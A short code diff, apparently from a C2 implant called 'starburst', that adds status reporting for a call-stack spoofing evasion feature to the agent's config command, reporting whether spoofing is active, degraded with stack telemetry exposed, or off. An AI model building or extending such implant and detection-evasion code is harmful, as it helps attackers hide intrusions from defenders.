@@ -93,6 +93,22 @@ auto declfn starburst::cmd_config(
         str_concat( result, inst.spawnto.x86_args );
     }
 
+    str_concat( result, symbol<char*>( const_cast<char*>( "\nspoof=" ) ) );
+#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
+    if ( inst.evasion.spoof.initialized ) {
+        str_concat( result, symbol<char*>( const_cast<char*>( "active" ) ) );
+    } else if ( inst.evasion.spoof.degraded ) {
+        str_concat( result, symbol<char*>( const_cast<char*>( "DEGRADED fallback=" ) ) );
+        int_to_str( tmp, inst.evasion.spoof.fallback_count, 10 );
+        str_concat( result, tmp );
+        str_concat( result, symbol<char*>( const_cast<char*>( " (stack telemetry exposed)" ) ) );
+    } else {
+        str_concat( result, symbol<char*>( const_cast<char*>( "off (profile) " ) ) );
+    }
+#else
+    str_concat( result, symbol<char*>( const_cast<char*>( "off (build) " ) ) );
+#endif
+
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, result );
 }
 
